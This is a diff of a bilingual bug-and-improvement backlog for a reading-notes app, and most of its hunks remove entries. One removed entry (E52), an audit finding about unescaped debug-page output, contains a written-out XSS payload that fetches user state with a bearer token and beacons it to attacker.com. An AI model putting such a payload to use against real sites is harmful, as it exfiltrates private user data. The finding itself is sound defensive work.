-**What:** `_authorized_for_admin()` at `app_server.py:3379-3382` returns `True` unconditionally when `AUTH_TOKEN` (= `$ADMIN_TOKEN` env) is empty: `if not AUTH_TOKEN: return True`. The three debug HTML pages gated by this check — `/debug/logs`, `/debug/errors`, `/debug/agent-dashboard` — are therefore **publicly accessible by anyone who discovers the URL** when the server is deployed without `ADMIN_TOKEN` set (which is the default). `/debug/logs` renders the last 100 model calls across **all users**, including full system prompts (containing each user's books, quotes, and reading notes), every user message, and every AI response.
-
-**Why it matters:** The default configuration is the production risk. A user can guess or find the URL (it's hardcoded in `app_server.py` and easily discovered via browser DevTools or a port scan), then read every other user's private AI conversation without authentication. This is a P0 privacy/security gap for a commercial app with paying users. The minimum fix is a two-line change: require an authenticated admin user session even when `ADMIN_TOKEN` is unset, using the existing `is_admin_username()` check.
-
-**Complexity:** S — in `_authorized_for_admin()` at line 3380, change `if not AUTH_TOKEN: return True` to `if not AUTH_TOKEN: return self._is_authenticated_admin()`, where `_is_authenticated_admin()` resolves the bearer token via `resolve_user_from_token()` and checks `is_admin_username(user["username"])`. Touch: `app_server.py:3379-3382`.
-
-**Files:** `app_server.py:3379-3382, 3675, 3786, 3828`
-
----
-
-### E42 — `execute_action()` reads and writes state non-atomically — concurrent approvals from two browser tabs silently discard mutations (M)
-
-**What:** `ActionExecutor.execute_action()` at `app_server.py:2956-3080` follows the pattern: `state = load_state(conn, user_id)` → mutate state in Python → `save_state(conn, user_id, state)`. This read-modify-write cycle is not wrapped in a `BEGIN IMMEDIATE` transaction or any other concurrency guard. If a user approves two agent actions in rapid succession from two browser tabs (or two open windows), both executions can read the same initial state, each apply their respective mutation, and then both write back — with the second write silently overwriting the first write's changes. For example: Tab A reads state with `books=[B1]`, adds B2; Tab B reads state with `books=[B1]`, adds B3; Tab A saves `[B1, B2]`; Tab B saves `[B1, B3]` — B2 is permanently lost with no error or warning.
-
-**Why it matters:** Agent actions (`add_book`, `add_note`, `summary`, `tag`, `link_thought`) are irreversible state mutations. Silent data loss on concurrent approvals erodes user trust and is invisible — no error is surfaced and no retry is possible. The fix is to wrap the read-modify-write in a `BEGIN IMMEDIATE` transaction (available on the existing `conn` object), making the entire pattern atomic within SQLite's write serialization.
-
-**Complexity:** M — add `conn.execute("BEGIN IMMEDIATE")` before `load_state()` and rely on `save_state()`'s existing `conn.commit()` as the commit. Handle `sqlite3.OperationalError: database is locked` at the handler level. Alternatively, implement `atomic_update_state(conn, user_id, fn)` helper that wraps the pattern in one place. Touch: `app_server.py:2956-3080`; callers at `/api/agent-actions/{id}/execute` (~line 5025).
-
-**Files:** `app_server.py:2956-3080`; `app_server.py:5025-5095` (execute handler)
-
----
 
 ### E43 — Username registration validates only minimum length — no max-length cap or character whitelist (S)
 
@@ -539,18 +271,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ## 2026-06-07
 
-### E47 — `reading_mcp_server.py` uses `datetime.now().isoformat()` — same naïve-local-time bug as OPT-024, unpatched path (S)
-
-**What:** `_now_iso()` at `reading_mcp_server.py:50-51` is defined as `return datetime.now().isoformat()` — identical to the call OPT-024 replaced with `utc_now_iso()` in `ActionExecutor`. It is used for `createdAt`/`updatedAt` on every record written by the five MCP tool functions: `add_note` (line 170), `add_book` (lines 272-273), `summary` (line 318), `tag` (line 402), and `link_thought` (line 488). The MCP dispatcher (`mcp_dispatcher.py`) is invoked from `app_server.py` via `MCPToolDispatcher.dispatch()` whenever any of these agent actions run.
-
-**Why it matters:** The frontend sorts books and quotes via `new Date(b.createdAt) - new Date(a.createdAt)`. A naïve local timestamp like `2026-06-07T20:00:00` is parsed as local time by the browser, giving records created via MCP an effective +8 h offset over user-created records (UTC+Z). On a UTC+8 server, MCP-sourced records appear ~8 hours earlier in time — exactly the same display-order corruption that OPT-024 fixed for ActionExecutor. OPT-024 patched the old execution path but the MCP path was introduced separately and was never updated.
-
-**Complexity:** S — change `_now_iso()` at `reading_mcp_server.py:50-51` to `from datetime import timezone; return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"` (or simply import and call the existing `utc_now_iso()` from `app_server.py` if the module boundary allows). No schema changes, no test changes beyond adding a UTC-suffix assertion in `reading_mcp_server_tools_test.py`.
-
-**Files:** `reading_mcp_server.py:50-51`; callers at lines 162, 170, 214, 264, 272-273, 318, 402, 488; `tests/agent/reading_mcp_server_tools_test.py` (add UTC assertion)
-
----
-
 ### E48 — Uploaded images are never cleaned up when books/quotes are deleted — orphaned files accumulate on disk indefinitely (M)
 
 **What:** `deleteBook()` in `app.js:1952-2007` and `deleteQuote()` in `app.js:2198-2213` both remove the book/quote from `state` and call `syncState()` — but neither calls any backend API to delete the associated image file stored under `uploads/<user_id>/<filename>`. There is no `/api/media/delete` endpoint or any backend GC for orphaned images. When a user uploads a book cover and then deletes the book, the image file remains on disk. `deleteBook()` also deletes all associated quotes (line 1969), orphaning their `imageUrl` files too. Only `DELETE /api/account` triggers an `shutil.rmtree(uploads_dir)` (line 5210-5214) — all other deletions leave the files behind.
@@ -575,18 +295,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ---
 
-### E50 — `<dialog>` elements have no `aria-labelledby` — screen readers announce modals with no name (WCAG 4.1.2 Level A) (S)
-
-**What:** `index.html` contains 9 `<dialog>` elements — `bookEditDialog`, `bookDetailDialog`, `bookDialog`, `sessionDialog`, `quoteDialog`, `quoteDetailDialog`, `deleteBookDialog`, `confirmDialog`, `forgotPasswordDialog`, `resetPasswordDialog` (lines 327, 355, 375, 410, 435, 480, 503, 516, 527, 539). None have an `aria-labelledby` attribute. Every dialog contains a visible `<h2>` heading (e.g. "新增书籍", "编辑书籍", "新增阅读记录") — the information is present but not linked to the dialog via ARIA. Screen readers announce only "dialog" when focus enters, with no title, leaving keyboard users without context about which modal opened.
-
-**Why it matters:** WCAG 2.1 SC 4.1.2 (Name, Role, Value — Level A) requires interactive UI components to have an accessible name. `<dialog>` elements are specifically called out: without `aria-label` or `aria-labelledby`, the dialog's "name" is empty. This is a Level A (most severe) compliance gap. The fix is purely additive: add `id` attributes to the existing `<h2>` headings and `aria-labelledby` attributes to the `<dialog>` elements — no logic changes.
-
-**Complexity:** S — for each dialog, add an `id` to its heading `<h2>` (e.g. `id="bookDialogTitle"`) and `aria-labelledby="bookDialogTitle"` to the `<dialog>`. Nine dialogs, ~18 HTML attribute additions, no JS changes. Touch: `index.html:327-620`.
-
-**Files:** `index.html:327, 355, 375, 410, 435, 480, 503, 516, 527, 539` (dialog + heading pairs)
-
----
-
 ### E51 — WAL file never checkpointed explicitly — unbounded WAL growth silently inflates disk usage between GC runs (S)
 
 **What:** `get_conn()` sets `PRAGMA journal_mode = WAL` once at startup (`app_server.py:334`). SQLite WAL mode auto-checkpoints when the WAL reaches 1000 pages (default `PRAGMA wal_autocheckpoint`), but auto-checkpoint uses `PASSIVE` mode — it does not reclaim disk space (does not shrink the WAL file). The WAL file (`app_state.db-wal`) can therefore grow indefinitely if checkpoints do not complete: under concurrent read load, a `PASSIVE` auto-checkpoint finds readers in the WAL and leaves pages unclaimed. The `_run_gc()` thread already runs every 6 hours on a dedicated connection — it is the natural place to issue `PRAGMA wal_checkpoint(TRUNCATE)`, which waits for all readers to vacate and then resets the WAL file to zero bytes.
@@ -600,18 +308,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 ---
 
 ## 2026-06-08
-
-### E52 — Debug dashboard injects user content unescaped into HTML — stored XSS via chat messages (S)
-
-**What:** The `/debug/logs` HTML page is built at `app_server.py:3848-3885` by splicing database rows directly into f-strings: `row['prompt']`, `row['input']`, `row['output']`, `row['username']`, `row['error']`, `json.dumps(action['data'])`, and `action['errorMessage']` are all inserted without escaping. `import html` is absent from the file. A registered user who sends a chat message containing `</pre><img src=x onerror="fetch('/api/state',{headers:{Authorization:'Bearer TOKEN'}}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.com',JSON.stringify(d)))">` gets that payload stored in `model_logs.input`. When the admin opens `/debug/logs`, the payload executes in their browser. The same pattern is present in the `/debug/errors` and `/debug/agent-dashboard` rendering blocks.
-
-**Why it matters:** OPT-028 restricted access to admin/loopback, but any registered user can plant a malicious message that persists in the top-100 log window. XSS against an admin session on a commercial app is a meaningful attack surface: the attacker can exfiltrate all users' state, forge API calls, or pivot to billing. Fixing it requires `import html` and wrapping each user-controlled f-string interpolation with `html.escape()` — a two-character function call per site.
-
-**Complexity:** S — `import html` (stdlib, no dependency) + `html.escape()` on the ~10 user-controlled interpolation sites at lines 3848-3885. Same fix applies to `/debug/errors` and `/debug/agent-dashboard` HTML builders. Zero functional change.
-
-**Files:** `app_server.py:3848-3885` (`/debug/logs` HTML builder); also scan `/debug/errors` (~line 3917) and `/debug/agent-dashboard` (~line 3950) rendering blocks for the same pattern.
-
----
 
 ### E53 — TraceManager commits after every individual event — 7-8 SQLite fsyncs per chat request (M)
 
@@ -713,18 +409,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ## 2026-06-10
 
-### E61 — `compareBooksForList()` secondary sort still uses `localeCompare` — `renderQuotes()` was defensively fixed by OPT-014 but `renderBooks()` was not (S)
-
-**What:** `compareBooksForList()` at `app.js:1026` sorts books within the same status bucket via `(b.createdAt || "").localeCompare(a.createdAt || "")`. OPT-014 identified this exact string-comparison pattern as bug-prone for timestamps and defensively updated `renderQuotes()` (line 1376) to use `(Date.parse(b.createdAt) || 0) - (Date.parse(a.createdAt) || 0)`. But `compareBooksForList()` was not updated — it is still using lexicographic string comparison. Additionally, `app.js:2431` uses the same `localeCompare` pattern to find the most-recently-updated book in the agent action context picker. With all timestamps now in UTC+Z format (OPT-024/031), `localeCompare` happens to produce correct results *most of the time*, but fails when one timestamp has milliseconds ("...000Z") and another does not ("...Z"): `"2026-06-10T14:00:00Z".localeCompare("2026-06-10T14:00:00.000Z")` returns positive (wrong) because `"Z"` (ASCII 90) sorts after `"."` (ASCII 46), placing the non-millisecond timestamp incorrectly above the millisecond one at the same second.
-
-**Why it matters:** OPT-014's comment in the fix summary explicitly states "frontend sort改为解析后比较 epoch: `new Date(b.createdAt) - new Date(a.createdAt)`，作为防御性加固" — the intent was to fix all sort sites. `compareBooksForList()` is the primary sort for the `#books` tab (every render call). Agent-created books (UTC, no milliseconds) added in the same second as user-created books (UTC, with milliseconds) can appear in the wrong order. The fix is two 1-line changes.
-
-**Complexity:** S — in `compareBooksForList()` (`app.js:1026`) replace `(b.createdAt || "").localeCompare(a.createdAt || "")` with `(Date.parse(b.createdAt) || 0) - (Date.parse(a.createdAt) || 0)` (note reversed: descending = b - a). Similarly fix line 2431. Touch: `app.js:1026, 2431`.
-
-**Files:** `app.js:1023-1028` (`compareBooksForList`); `app.js:2431` (most-recently-active book finder)
-
----
-
 ### E62 — No `robots.txt` endpoint — search engines can discover and repeatedly crawl `/api/*`, `/debug/*`, `/media/*` (S)
 
 **What:** `app_server.py`'s `do_GET()` handler has no route for `/robots.txt`. All routes not matched by `_STATIC` or explicit path checks fall through to a 404. When search engine crawlers discover the app (via a link, a shared URL, or browser history), they will attempt to index `/api/login`, `/api/register`, `/debug/logs`, `/debug/errors`, and `/media/<uuid>/<file>`. Each such request hits the backend, triggers authentication checks or 404 processing, and leaves server-error entries in the log. For the `/api/*` endpoints this causes spurious 401 entries; for `/debug/*` it may trigger HTML rendering under admin accounts; for `/media/*` it can create unwanted cache entries in CDN/proxy layers.
@@ -799,18 +483,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ---
 
-### E68 — Session CRUD and Connection CRUD have no frontend JS tests — two of the four main tabs are regression-blind (M)
-
-**What:** `tests/frontend/` contains 13 test files, but none cover the session timeline or connections tabs. The books tab has `book-duplicate.test.js`, `book-list-ordering-fix.test.js`, `book-ocr.test.js`; the quotes tab has `quote-content-display.test.js`, `ocr-stale-recovery.test.js`. The **sessions** tab (`renderTimeline()` at `app.js:1335-1480`, `addSession()`/`editSession()`/`deleteSession()` at `app.js:2290-2340`) and **connections** tab (`renderConnections()` at `app.js:720-760`, `addConnection()`/`editConnection()`/`deleteConnection()` at `app.js:3480-3530`) have zero dedicated test coverage. `renderTimeline()` is ~145 lines of DOM logic with date-grouping, status-filter, and card-link wiring that could silently regress. The connections sub-render is 40 lines with bidirectional label resolution.
-
-**Why it matters:** Sessions are the primary daily-use feature (users log reading time after each session). Connections are the unique "thought-linking" capability that differentiates the app from a simple book tracker. Both have been touched in recent refactors (OPT-027 unified the card menu, adding new event wiring). Yet neither has a single JS test to catch regressions. Adding test files follows the exact same Node vm-sandbox pattern already established in `tests/frontend/ui-redesign.test.js` and `tests/frontend/chat-agent-approval.test.js` — no server needed, no new test framework.
-
-**Complexity:** M — write `tests/frontend/session-crud.test.js` (render with fixture sessions, assert card count, assert delete calls syncState, assert status filter); write `tests/frontend/connection-crud.test.js` (render with fixture connections, assert bidirectional card labels, assert search filter). ~60-80 lines each. Touch: `tests/frontend/` (two new test files); `app.js:1335-1480, 2290-2340, 720-760` (no changes, test against existing code).
-
-**Files:** `app.js:1335-1480` (`renderTimeline`); `app.js:2290-2340` (`deleteSession`); `app.js:720-760` (`renderConnections`); `tests/frontend/` (new test files)
-
----
-
 ### E69 — No per-user limit on concurrent `/api/chat/stream` SSE connections — many open tabs can exhaust the `ThreadingHTTPServer` thread pool (M)
 
 **What:** `ThreadingHTTPServer` spawns one OS thread per connection; active SSE clients hold their thread alive for up to 30 seconds (the idle-abort timeout from E24/OPT). There is no per-user or global cap on concurrent open SSE connections. A user with 10 browser tabs can fire 10 simultaneous streaming chat requests (each passing the per-user rate-limit check since they are distinct requests in rapid succession before any counter increments). Each request blocks a thread waiting on `DeepSeek` streaming response (5–30 s). At 10 tabs × 30 s, that user monopolises ~10 threads for 30 seconds; at the OS default thread-stack size (~2–8 MB), 200 concurrent connections exhaust 400–1600 MB of RAM. The existing `_enforce_rate_limit()` is count-based (requests/hour) and fires at the top of the handler — it does not track in-flight connections.
@@ -872,18 +544,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 **Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:1473`. Optionally add the 300-second guard from E23 in the same diff. Touch: `app_server.py:1473`.
 
 **Files:** `app_server.py:1473` (`resolve_user_from_token` last_seen_at update); `app_server.py:1466-1474` (session expiry + update block)
-
----
-
-### E74 — `PromptBuilder.all_books_summary` injected without count limit — 500-book users pay ~8,000 extra tokens per chat request (S)
-
-**What:** `PromptBuilder.build_chat_prompt()` at `app_server.py:2326-2329` always injects `all_books_summary` as the full list of every book in the user's library: `[{"id": b.get("id"), "title": b.get("title"), "author": b.get("author", "")} for b in user_state.get("books", [])]` — no limit. OPT-020 already addressed a similar waste (`existing_connections[:20]` conditionally excluded for book/quote context) but did not cap `all_books_summary`. A power user with 500 books injects ~500 × 3 fields: assuming 16-char IDs, 25-char titles, 15-char authors = ~56 chars per entry × 500 = 28,000 chars ≈ 7,000 tokens added to every chat system prompt, unconditionally. The system instructions (lines 2359, 2363) reference `all_books_summary` IDs only for `link_thought` target selection — and OPT-020's rationale was that `link_thought` is only generated when the user explicitly asks. The `all_books_summary` is therefore wasted for 80%+ of requests in the same way `existing_connections` was.
-
-**Why it matters:** OPT-020 reduced per-request token waste by ~150 tokens and was shipped immediately as a cost saving. The `all_books_summary` issue is proportionally larger: a 500-book user wastes 7,000 tokens/request × 240 requests/day = 1,680,000 tokens/day in redundant book summaries. The fix is the same conditional pattern as OPT-020: cap at `[:50]` (enough for `link_thought` target selection) and only include books beyond the current one for the `link_thought` use case. Alternatively, inject only `{"count": N}` plus the top-10 most-recently-active books as a minimal summary when no `link_thought` use is expected.
-
-**Complexity:** S — change `app_server.py:2326-2329` to cap `all_books_summary` at the 50 most-recently-active books: `[...books_sorted_by_recency...][:50]`. For extra savings, exclude the current book from `all_books_summary` (it's already in the `book` field). This is a 2-line change with zero behavior change for the 95%+ of users with fewer than 50 books. Touch: `app_server.py:2326-2329`.
-
-**Files:** `app_server.py:2312-2331` (`PromptBuilder.build_chat_prompt`); no test changes needed.
 
 ---
 
@@ -1126,74 +786,7 @@ if (els.sessionStats) {
 
 ---
 
-### E86 — 摘抄卡面从不显示图片缩略图——拍照 OCR 后卡面无视觉区分度 (S)
-
-**What:** `renderQuotes()` 中的卡面模板（`app.js:1449-1452`）：
-```javascript
-<div class="entry-card-cover">
-  <div class="entry-cover-fallback"></div>
-  <span class="entry-type-chip ...">...</span>
-</div>
-```
-无论 `quote.imageUrl` 是否存在，始终只渲染占位块 `entry-cover-fallback`，不显示图片。对比书卡（`app.js:1133-1134`）：
-```javascript
-<img src="${coverImage}" alt="${escapeHtml(book.title)}" />
-```
-会显示封面或摘抄图片 fallback。`openQuoteDetail()`（`app.js:2159-2160`）在详情弹窗中 **确实**加载了图片（`img.src = resolveImageUrl(quote.imageUrl)`），说明图片已上传并有 URL，只是卡面未渲染。
-
-**Why it matters:** Theme 1「采集顺滑」要求拍照→OCR→成卡的全链路可靠且有清晰反馈。拍了照、识别了文字，但成卡后卡面与纯文字卡完全一样（同一个灰色占位块）——用户没有视觉确认"照片已关联到这张卡"。随着 OCR 摘抄增多，整个卡片墙视觉单调、无法区分哪些是图片卡。修复仅需在卡面模板条件渲染一个 `<img>`（类似书卡已有实现），约 3 行。
-
-**Complexity:** S — 在 `app.js:1449` 的 `entry-card-cover` 内条件加 `${quote.imageUrl ? \`<img src="${resolveImageUrl(quote.imageUrl)}" alt="摘抄图片">\` : '<div class="entry-cover-fallback"></div>'}`；CSS 样式沿用已有 `.entry-card-cover img`（书卡已定义）。无后端改动、无测试变更。
-
-**Files:** `app.js:1449-1452`（模板改动）；`styles.css`（如需调整摘抄卡内图片尺寸规则，约 2 行）
-
-**northstar:** 强——直接服务 Theme 1「采集顺滑」：拍照录入是最高频场景，卡面应有视觉确认；与「不假思索的默认工具」北极星一致（完成操作后立即得到正向反馈）。S 复杂度，无副作用。
-
----
-
 ## 2026-06-16
-
-### E87 — 「↓ 最新」按钮独占一个布局行压缩消息区——改为叠加在消息列表上的浮动按钮 (S)
-
-**What:** `index.html:190-192` 中，「↓ 最新」按钮包裹在独立的 `<div class="chat-scroll-btn-row" id="chatScrollBtnRow" hidden>`：
-
-```html
-<div class="chat-scroll-btn-row" id="chatScrollBtnRow" hidden>
-  <button id="chatScrollBtn" class="chat-scroll-btn" type="button" aria-label="回到最新">↓ 最新</button>
-</div>
-```
-
-该 div 是 `.chat-panel` flex 列的第三个子元素（夹在 `#chatMessages` 和 `.chat-composer` 之间），`styles.css:2069-2073` 定义为 `display: flex; padding: 4px 4px 0`，可见时占用约 30px 垂直高度。在桌面端（`styles.css:3597-3600`），该 div 同样占 `grid-row: 3`，夹在 `grid-row: 2`（`1fr` messages）和 `grid-row: 4`（composer）之间。由于聊天面板高度固定（`height: min(860px, calc(100dvh - 64px))`），该行出现时直接从 `#chatMessages` 的可用高度里扣除 ~30px。Owner 在 signals 2026-06-16 记录："聊天输入框里「最新」独占一行，挤压了左侧交互内容的空间 → 希望它不占整行"。
-
-**Why it matters:** 「↓ 最新」在用户滚动回看历史消息时出现，此时聊天面板空间已因消息区被占而更紧；弹出后再压缩 30px 会让 composer 区（快捷 chip 行 + 输入框 + 发送键）更拥挤。修复是将该按钮改为 `position: absolute` 叠加在 `#chatMessages` 右下角——这是 WhatsApp/Telegram 等聊天应用的标准模式，不占任何布局空间。
-
-**Complexity:** S — 改 `styles.css`：给 `#chatMessages` 加 `position: relative`，将 `.chat-scroll-btn-row` 改为 `position: absolute; bottom: 8px; right: 8px; z-index: 2`（并移除 `display: flex` 容器改 `display: block`），或直接改按钮本身为 `position: absolute`。同步修改 `chat.js:273, 441, 894`（控制 `scrollBtnRow.hidden` 的逻辑不变）。无 HTML 结构改动，无 JS 逻辑改动。
-
-**Files:** `styles.css:2069-2073`（`.chat-scroll-btn-row` 规则）；`styles.css:3597-3600`（桌面端 grid-row override）
-
-**northstar:** 中——chat 是「探讨」核心入口，输入区舒适度直接影响写作流畅度；owner 真机 signal 驱动，S 复杂度，Theme 1「不假思索的默认工具」辅助。
-
----
-
-### E88 — 快速 OCR 填入整页全文后无行级删除 UI，用户须手动选删大段内容 (M)
-
-**What:** `index.html:476` 的帮助文本已明确写道："「快速识别」秒出整页全文"。`app.js:511-523` 的 `normalizeOcrText()` 保留 `\n` 分隔的多行结构（`split("\n").map(line=>line.trim()).join("\n")`）。快速 OCR 完成后，`app.js:1554` 将完整识别文本填入 `#quoteContent` textarea：
-
-```javascript
-contentEl.value = recognizedText;  // ← 整页全文，可能十几行
-```
-
-此后没有任何行级操作 UI——用户必须在 textarea 里手动选中并删除不需要的行，才能保留划线的那一两句。Quote 编辑弹窗（`index.html:444-486`）目前在 OCR 完成后没有提供行选择或批量删除辅助界面。Owner 2026-06-16 signals 记录："快速 OCR 很快但会识别整页全文，只想留划线句，得手动删一大堆很麻烦 → 希望能「一行一行快速删除」OCR 结果"。
-
-**Why it matters:** 这是 Theme 1「采集顺滑」验收标准的直接障碍。拍照→快速 OCR→删到只剩划线句，每次需要额外 20-60 秒手工删除，而 AI 精识别虽可自动提取，但更慢（又回到 OPT-016 的原始痛点）。理想流程：快速 OCR 返回全页文本后，把文本按行展示为可逐行删除的 chip 列表；用户点删不要的行（1-2 次点击），留下的行合并为最终内容；比 textarea 选删更快。
-
-**Complexity:** M — 在 `quoteDialog` 的 OCR 完成路径里新增一个「行选择」UI 组件：`syncOpenQuoteFormFromState()`（`app.js:1548-1556`）检测识别文本行数 ≥ 3 时，隐藏 textarea、展示行列表（每行含删除按钮），「确认行选择」按钮把留下的行合并写回 textarea 并恢复正常编辑模式。需新增约 40 行 JS + 20 行 CSS；无后端改动，无 schema 变更。
-
-**Files:** `app.js:1548-1566`（`syncOpenQuoteFormFromState` OCR done 分支）；`index.html:444-486`（quote dialog 可加行列表 UI 区）；`styles.css`（新增行删除组件样式）
-
-**northstar:** 强——直接驱动 Theme 1「采集顺滑」：快速 OCR 已「快」，但产生整页冗余文本让「顺」失效；owner 真机 signal 2026-06-16 明确指出这是采集摩擦。是现阶段最值得投入的 M 复杂度功能改进。
-
----
 
 ### E89 — `deleteBook` 弹窗仅显示书名，级联删除数量不具体——用户删前不知将失去多少内容 (S)
 
@@ -1349,43 +942,6 @@ requestAnimationFrame(() =>
 
 ## 2026-06-18
 
-### E94 — Session 新建表单日期预填 UTC 日期，UTC+8 凌晨用户（00:00–08:00）看到昨天日期 (S)
-
-**What:** `app.js:2261`（`openNewSessionForm()` 中），新建阅读记录表单的日期字段预填：
-```javascript
-els.sessionForm.querySelector('[name="date"]').value = new Date().toISOString().split("T")[0];
-```
-`new Date().toISOString()` 返回 UTC 时间的 ISO 字符串，`.split("T")[0]` 取日期部分为 **UTC 日期**。UTC+8 时区下，本地时间 00:00–07:59（例如凌晨 1 点读书）对应 UTC 前一天 16:00–23:59——`toISOString()` 给出昨天的日期，但用户实际在今天读书。
-
-`app.js:2140`（`editSession()` 中）有同族写法：
-```javascript
-const dateStr = session.date ? new Date(session.date).toISOString().split("T")[0] : "";
-```
-此处 `session.date` 存储为 `YYYY-MM-DD` 字符串，`new Date("2026-06-18")` 解析为 UTC 00:00，再 `toISOString()` 仍得 `"2026-06-18"`——此处实际安全，但依赖 UTC midnight 日期字符串的特殊行为，可读性差。
-
-`index.html:430` 的日期 `<input>` 无 `max` 属性，用户可选择未来日期而不受限：
-```html
-<label><span>日期</span><input name="date" type="date" /></label>
-```
-
-**Fix（最小改动）：** 仅需修 `app.js:2261`：
-```javascript
-// 旧：new Date().toISOString().split("T")[0]
-// 新：
-const todayLocal = new Intl.DateTimeFormat("sv").format(new Date());
-input.value = todayLocal;
-input.max = todayLocal;  // 同步加 max 防未来日期，搭便车修
-```
-`"sv"` locale 在所有现代浏览器中返回 `YYYY-MM-DD` 本地时区格式，无需任何 polyfill。
-
-**Complexity:** S — 1-2 行改动；`index.html:430` 可选搭便车加 `max`（JS 动态设置）；无后端改动，无测试变更（可选加断言）。
-
-**Files:** `app.js:2261`（主改动点）；`app.js:2140`（可选清理同族写法）；`index.html:430`（可选搭便车 max 属性）
-
-**northstar:** 中——Theme 1「采集顺滑」数据准确性：凌晨读书记录日期错误直接损害「零丢失/零错数据」验收标准，owner 是 UTC+8，晚睡读书高频场景。S 复杂度，零风险。
-
----
-
 ### E95 — 关联搜索 haystack 只含书名，按摘抄原文无法检索关联关系 (S)
 
 **What:** `app.js:740-756`（`renderConnections()` 搜索过滤块）构建 haystack：
@@ -1535,32 +1091,6 @@ const dateNote = session?.date ? ` · ${session.date}` : "";
 
 ## 2026-06-20
 
-### E100 — `showConfirmDialog()` 与 `deleteBook()` 均未处理 Escape 关闭，残留 `{ once: true }` 监听器可触发错误删除 (S)
-
-**What:** 两处对话框实现均在 Escape 键关闭时留下游离监听器：
-
-1. **`showConfirmDialog()`**（`app.js:2286-2297`）在 `confirmDialogConfirmBtn` 和 `confirmDialogCancelBtn` 上注册 `{ once: true }` 处理器，但**未**在 `els.confirmDialog` 上注册 `cancel` 事件监听（浏览器原生 Escape 键会触发 `<dialog>` 的 `cancel` 事件）。Escape 关闭时，两个按钮的 `{ once: true }` 处理器从未触发、从未消费，持续存留；下次 `showConfirmDialog()` 调用再次堆叠新处理器——下次点击确认按钮时，旧闭包（捕获上一操作的 `onConfirm`）与新闭包同时触发。该函数被至少 6 处调用：`deleteSession`（`app.js:2301`）、`deleteQuote`（`app.js:2318`）、`deleteAccount`（`app.js:2949`）、Excel 导入守卫（`app.js:3067, 3086`）等。
-2. **`deleteBook()`**（`app.js:2070-2127`）定义了 `cleanup()` 调用 `removeEventListener`，但 `cleanup()` 仅在 `onConfirm`（`app.js:2094`）和 `onCancel`（`app.js:2099`）中调用，**未**在 `deleteBookDialog` 上注册 `cancel` 事件监听。每次 Escape 关闭 deleteBook 对话框，一个捕获特定 `bookId` 的 `onConfirm` 闭包便永久挂在 `deleteBookConfirmBtn` 上；多次 Escape 后，下次点击确认可连续删除多本书。
-
-**Why it matters:** Escape 是 mobile Safari 以外浏览器的常见关闭手势，用户改变主意时频繁使用。漏斗最底层（删除确认）出现幂等性破坏，可导致难以察觉的数据丢失，与 Theme 1「零数据丢失」验收直接冲突。修复极简、风险极低。
-
-**Complexity:** S — `showConfirmDialog` 函数体内追加 1 行 `cancel` 监听；`deleteBook` 内追加同等 1 行，无 HTML/后端/测试改动。
-
-```javascript
-// showConfirmDialog fix (app.js:2295 后追加):
-els.confirmDialog.addEventListener("cancel", () => {}, { once: true });
-// 更准确写法（同时清除 confirm 按钮残留处理器方案，参见 how）
-
-// deleteBook fix (app.js:2127 附近):
-els.deleteBookDialog.addEventListener("cancel", cleanup, { once: true });
-```
-
-**Files:** `app.js:2286-2297`（`showConfirmDialog`），`app.js:2070-2127`（`deleteBook`）
-
-**northstar:** 中——数据安全是 Theme 1「零丢失」验收的硬性约束；S 复杂度修复成本远低于单次误删负影响。
-
----
-
 ### E101 — `PromptBuilder.build_chat_prompt()` 向 LLM 发送摘抄的 UI 专属字段，每次对话浪费数百至数万 token (S)
 
 **What:** `app_server.py:2319` 将摘抄列表以**完整对象**形式写入 LLM payload：
@@ -1588,48 +1118,6 @@ els.deleteBookDialog.addEventListener("cancel", cleanup, { once: true });
 **Files:** `app_server.py:2312-2345`（`PromptBuilder.build_chat_prompt`），`app_server.py:1347-1352`（`ocrText` 写入点，供验证）
 
 **northstar:** 中——与 OPT-020/OPT-047 同类，直接降低每次探讨的 API 成本，Theme 1 成本控制的遗漏项。
-
----
-
-### E102 — `compress_chat_history_if_needed()` API 失败时静默写入截断历史，永久丢失旧消息 (S)
-
-**What:** `app_server.py:2267-2292`（`compress_chat_history_if_needed`）在 `call_deepseek()` 抛出异常（超时、429、网络故障）时进入 `except` 分支：
-
-```python
-# app_server.py:2279-2291
-try:
-    summary = call_deepseek(...)
-    compressed = [...summary...] + recent
-except Exception:
-    compressed = recent            # ← fallback: 仅保留最近 6 条
-state.setdefault("chatHistories", {})[history_key] = compressed
-save_state(conn, user_id, state)   # ← 无论成功/失败，都写 DB
-return compressed
-```
-
-`_COMPRESS_KEEP_RECENT = 6`（`app_server.py:2264`），`_COMPRESS_THRESHOLD = 10`（`app_server.py:2263`）。触发条件：历史超过 10 条时压缩；失败则将截断后的 6 条**立即持久化到 SQLite**。下次请求读回的 `chatHistories` 已是截断版本，早期消息永久不可恢复。
-
-一次 DeepSeek 临时限速（返回 429）即可触发：用户连续聊 6 轮后（约 3 分钟使用），若 API 此刻拥堵，第 11 条消息的处理会静默丢弃前 5 条历史。
-
-**Why it matters:** 聊天记录是「探讨历史」的唯一载体，是 Theme 2「回顾有价值」的核心资产。探讨 10 轮已是深度交流，此时发生无声数据丢失对用户体验的破坏性高于任何 UI 摩擦。修复只需 2 行：`except` 块中 `return history`（不保存），让下次请求再次尝试压缩。
-
-**Complexity:** S — 将 `save_state` 移入 `try` 块内（压缩成功才写入），`except` 改为 `return history`；无 schema/前端/测试改动。
-
-```python
-# 修复草案
-try:
-    summary = call_deepseek(...)
-    compressed = [...] + recent
-    state.setdefault("chatHistories", {})[history_key] = compressed
-    save_state(conn, user_id, state)
-    return compressed
-except Exception:
-    return history   # 压缩失败时原样返回，下次重试
-```
-
-**Files:** `app_server.py:2267-2292`（`compress_chat_history_if_needed`）
-
-**northstar:** 中——聊天历史是 Theme 2「回顾有价值」的前提数据；API 瞬断造成的静默丢失与 OPT-040/041 进口丢失同类（数据安全边界），S 修复成本极低。
 
 ---
 
@@ -1669,70 +1157,6 @@ def save_state(conn, user_id, state):
